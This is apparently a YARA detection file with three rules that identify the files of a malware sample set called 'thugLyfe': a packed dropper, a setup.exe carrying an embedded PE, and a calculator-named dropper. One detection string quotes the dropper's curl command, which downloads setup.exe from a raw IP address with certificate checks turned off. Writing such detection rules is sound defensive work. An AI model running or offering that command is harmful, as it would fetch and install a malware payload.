import "pe"
import "hash"
rule is_thugStylePacked { //dasuwerugwuerwq.exe
	meta:
		description = "Detects the thugLyfe malicious file 'dasuwerugwuerwq.exe' which is a packed dropper"
		author = "Eamon Stackpole"
		editor = "N/A"
		date = "2025-10-2"
	strings:
		$upx1 = "UPX0"
		$upx2 = "UPX1"
		$http = /ttps/  //need to append reg expression to allow for spaces
		$installer = "setup.exe"
	condition:
		//hash.md5(0,filesize) == "92d6bf994b6dc42a8a491c75353f7c28" or //md5 hash check
		(
		any of ($upx*) and //UPX Packing
		$http and // HTTP activity
		$installer //install executable
		)
}

rule is_thugStyleEmbeddedPE { //setup.exe
	meta:
		description = "Detects the thugLyfe malicious file 'setup.exe' which contains an embedded PE file"
		author = "Eamon Stackpole"
		editor = "N/A"
		date = "2025-10-2"	
	strings:
		$notNice = "I'm really mean. RAAAAH!"
		$dosMode = /This program cannot be run in DOS mode/
	condition:
		//hash.md5(0,filesize) == "ab63fef0fa76af170e6c4871898b5f4f" or // md5 hash check
		(
		$notNice and //unique string
		#dosMode >= 2 and //Embedded PE
		(pe.number_of_exports < 5 or pe.number_of_exports > 10) and //Sus num export
		(uint16(0) == 0x5A4D and uint32(uint32(0x3C)) ==  0x00004550) and //File Headers
		(pe.number_of_sections < 6 or pe.number_of_sections > 8) //Sus num of sections
		)
		
}

rule is_thugStyleDropper { //simplecalc.exe
	meta:
		description = "Detects the thugLyfe malicious file 'simplecalc.exe', which is a dropper for the setup.exe file"
		author = "Eamon Stackpole"
		editor = "N/A"
		date = "2025-10-02"
	strings:
		$curl = "curl -k -o setup.exe https://165.73.244.11/installers/setup.exe"
	condition:
		//hash.md5(0,filesize) == "98d7b0e73e14cffc784bd47c772cfe8c" or //md5 hash check
		(
		$curl and //curl command
		(pe.number_of_exports < 5 or pe.number_of_exports > 10) and //Sus num export
		(uint16(0) == 0x5A4D and uint32(uint32(0x3C)) ==  0x00004550) and //File Headers
		(pe.number_of_sections < 6 or pe.number_of_sections > 8) //Sus num of sections
		
		)
}

